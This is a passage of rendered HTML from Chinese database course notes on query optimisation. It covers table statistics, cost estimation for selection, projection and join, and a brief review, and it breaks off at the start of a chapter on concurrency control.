encoding="application/x-tex">B(R):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>关系R的磁盘块数目</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">I_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>或<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">I(R):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>关系R的每个元组的字节数</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">f_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>或<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">f(R):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>R的块因子，即一个块中能够储存的R的元组数目</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>R</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">V(A,R):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>R中属性A出现不同值的数目</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mi>C</mi><mo stretchy="false">(</mo><mi>A</mi><mo separator="true">,</mo><mi>R</mi><mo stretchy="false">)</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">SC(A,R):</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">SC</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>R中属性A的选择基数，满足A上等值条件的平均记录数</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>:</mo></mrow><annotation encoding="application/x-tex">b:</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span></span></span></span></eq>每个磁盘块的字节数</li><li>…</li></ul><p>DBMS依据上述统计信息对DB操作的各种物理查询计划进行评估，以确定最优的计划予以执行。</p><h4 id="%EF%BC%883%EF%BC%89%E5%A6%82%E4%BD%95%E6%94%B6%E9%9B%86%E8%BF%99%E4%BA%9B%E4%BF%A1%E6%81%AF" tabindex="-1">（3）如何收集这些信息</h4><ul><li>当一个表装入内存和创建索引的时候，统计信息不是被自动收集的，必须有DBA使用特定的命令来完成信息统计，这些命令就是收集统计信息并把其存入系统目录中的实用程序</li><li>随着表的更新操作。统计信息可能会过时，过时的统计信息会使DBMS确定方案时决策错误，因此要求DBA定期的对有频繁更新操作的Table进行统计</li><li>DBA要熟悉统计信息收集命令的使用，并定期执行</li></ul><h3 id="2107-%E4%BB%A3%E4%BB%B7%E4%BC%B0%E7%AE%97" tabindex="-1">2107 代价估算</h3><h4 id="%EF%BC%881%EF%BC%89%E6%8A%95%E5%BD%B1%E8%BF%90%E7%AE%97%E7%9A%84%E4%BB%A3%E4%BB%B7%E4%BC%B0%E7%AE%97" tabindex="-1">（1）投影运算的代价估算</h4><ul><li>投影运算并未减少行数，但可能有效地减少了存储结果关系地块数</li></ul><h4 id="%EF%BC%882%EF%BC%89%E9%80%89%E6%8B%A9%E8%BF%90%E7%AE%97%E5%9C%B0%E4%BB%A3%E4%BB%B7%E4%BC%B0%E7%AE%97" tabindex="-1">（2）选择运算地代价估算</h4><p>估算选择运算<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><msub><mi>σ</mi><mrow><mi>A</mi><mo>=</mo><mi>c</mi></mrow></msub><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S=\sigma_{A=c}(R)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mrel mtight">=</span><span class="mord mathnormal mtight">c</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span></span></span></span></eq>的大小</p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(S)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span></span></span></span></eq>介于0 到<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mo>−</mo><mi>V</mi><mo stretchy="false">(</mo><mi>R</mi><mo separator="true">,</mo><mi>A</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">T(R)-V(R,A)+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></eq>之间<ul><li>最多：A属性不同值的元组都只存在一个，剩余的都是<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>=</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">A=c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span></eq>的分组</li></ul></li><li>估计：<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo><mo>=</mo><mi>T</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>V</mi><mo stretchy="false">(</mo><mi>R</mi><mo separator="true">,</mo><mi>A</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(S)=T(R)/V(R,A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mclose">)</span></span></span></span></eq><ul><li>A属性的不同值的元组假设是平均分布的</li></ul></li><li>当不知道<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo stretchy="false">(</mo><mi>R</mi><mo separator="true">,</mo><mi>A</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">V(R,A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">A</span><span class="mclose">)</span></span></span></span></eq>时，估计：<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo><mo>=</mo><mi>T</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>10</mn></mrow><annotation encoding="application/x-tex">T(S)=T(R)/10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mord">/10</span></span></span></span></eq></li></ul><p>估算选择运算<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><msub><mi>σ</mi><mrow><mi>A</mi><mo>&lt;</mo><mi>c</mi></mrow></msub><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S=\sigma_{A&lt;c}(R)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mrel mtight">&lt;</span><span class="mord mathnormal mtight">c</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1774em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span></span></span></span></eq>的大小</p><ul><li>一般取<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo><mo>=</mo><mi>T</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>3</mn></mrow><annotation encoding="application/x-tex">T(S)=T(R)/3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span><span class="mord">/3</span></span></span></span></eq></li></ul><p>估算选择运算<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><msub><mi>σ</mi><mrow><mi>C</mi><mn>1</mn><mi>o</mi><mi>r</mi><mi>C</mi><mn>2</mn></mrow></msub><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S=\sigma_{C1 or C2}(R)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span><span class="mord mtight">1</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">or</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span></span></span></span></eq></p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo><mo>=</mo><mi>n</mi><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mfrac><mrow><mi>m</mi><mn>1</mn></mrow><mi>n</mi></mfrac><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mfrac><mrow><mi>m</mi><mn>2</mn></mrow><mi>n</mi></mfrac><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(S)=n(1 - (1-\frac{m1}{n})(1-\frac{m2}{n}))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">))</span></span></span></span></eq>,m1为满足<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">C1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">1</span></span></span></span></eq>的个数，m2为满足<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">C2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">2</span></span></span></span></eq>的个数，R有n个元组</li></ul><h4 id="%EF%BC%883%EF%BC%89%E8%BF%9E%E6%8E%A5%E8%BF%90%E7%AE%97%E7%9A%84%E4%BB%A3%E4%BB%B7%E4%BC%B0%E7%AE%97" tabindex="-1">（3）连接运算的代价估算</h4><p>估计连接运算<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><mi>R</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mi>N</mi><mi>a</mi><mi>t</mi><mi>u</mi><mi>r</mi><mi>a</mi><mi>l</mi><mi>J</mi><mi>o</mi><mi>i</mi><mi>n</mi><mi>S</mi><mo stretchy="false">(</mo><mi>Y</mi><mo separator="true">,</mo><mi>Z</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S=R(X,Y) Natural Join S(Y,Z)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal" style="margin-right:0.09618em;">J</span><span class="mord mathnormal">o</span><span class="mord mathnormal">in</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span></span></span></span></eq>的大小</p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>T</mi><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo><mi>T</mi><mo stretchy="false">(</mo><mi>S</mi><mo stretchy="false">)</mo></mrow><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>V</mi><mo stretchy="false">(</mo><mi>R</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>V</mi><mo stretchy="false">(</mo><mi>S</mi><mo separator="true">,</mo><mi>Y</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">T(S)=\frac{T(R)T(S)}{max(V(R,Y),V(S,Y))}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.53em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ma</span><span class="mord mathnormal mtight">x</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span><span class="mclose mtight">)</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span><span class="mclose mtight">))</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span><span class="mclose mtight">)</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></eq></li></ul><h3 id="2108-%E5%9B%9E%E9%A1%BE" tabindex="-1">2108 回顾</h3><p>以往关系型数据库被认为是不可能的，因为连接会产生巨大的中间数据，但在查询优化后，中间数据变得可以接受，使得关系型数据库成为了现实。</p><ul><li>查询优化<ul><li>逻辑层优化<ul><li>关系代数操作次序优化</li></ul></li><li>物理层优化<ul><li>代价估算</li><li>算法选择和装配次序</li></ul></li></ul></li></ul><h2 id="%E7%AC%AC%E4%B8%83%E7%AB%A0-%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6-%E5%8F%8A-%E7%AC%AC%E5%85%AB%E7%AB%A0-%E5%86%8D%E8%AE%BA%E4%BA%8B%E5%8A%A1%E7%AE%A1%E7%90%86" tabindex="-1">第七章 并发控制 及 第八章 再论事务管理</h2><h3 id="2201-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8C%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6" tabindex="-1">2201 为什么要进行并发控制</h3><h4 